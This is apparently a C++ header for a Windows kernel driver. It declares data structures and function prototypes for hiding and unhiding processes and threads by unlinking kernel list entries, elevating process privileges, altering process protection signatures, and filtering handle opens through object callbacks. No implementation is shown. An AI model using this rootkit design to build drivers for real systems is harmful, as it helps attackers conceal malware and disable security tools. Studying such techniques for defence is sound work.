#pragma once
#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
}

// Definitions.
constexpr SIZE_T MAX_PIDS = 256;
constexpr SIZE_T MAX_TIDS = 256;
constexpr SIZE_T SYSTEM_PROCESS_PID = 0x4;
constexpr SIZE_T PROCESS_TERMINATE = 0x1;
constexpr SIZE_T PROCESS_CREATE_THREAD = 0x2;
constexpr SIZE_T PROCESS_VM_READ = 0x10;
constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;

struct ProtectedProcessesList {
	int PidsCount;
	ULONG Processes[MAX_PIDS];
};

struct HiddenProcess {
	ULONG Pid;
	PLIST_ENTRY ListEntry;
};

struct HiddenProcessList {
	int PidsCount;
	HiddenProcess Processes[MAX_PIDS];
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

struct ProcessGlobals {
	ProtectedProcessesList ProtectedProcesses;
	HiddenProcessList HiddenProcesses;
	FastMutex Lock;

	void Init() {
		HiddenProcesses.PidsCount = 0;
		ProtectedProcesses.PidsCount = 0;
		Lock.Init();
	}
};
inline ProcessGlobals pGlobals;

struct ThreadsList {
	int TidsCount;
	ULONG Threads[MAX_TIDS];
};

struct ThreadGlobals {
	ThreadsList ProtectedThreads;
	FastMutex Lock;

	void Init() {
		ProtectedThreads.TidsCount = 0;
		Lock.Init();
	}
};
inline ThreadGlobals tGlobals;

// Prototypes.
bool FindThread(ULONG tid);
bool AddThread(ULONG tid);
bool RemoveThread(ULONG tid);
bool FindProcess(ULONG pid);
bool AddProcess(ULONG pid);
bool RemoveProcess(ULONG pid);
bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
PLIST_ENTRY GetHiddenProcess(DWORD pid);
NTSTATUS ElevateProcess(ULONG pid);
NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
void RemoveListLinks(PLIST_ENTRY current);
void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
NTSTATUS UnhideProcess(ULONG pid);
NTSTATUS HideProcess(ULONG pid);
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
NTSTATUS HideThread(ULONG tid);

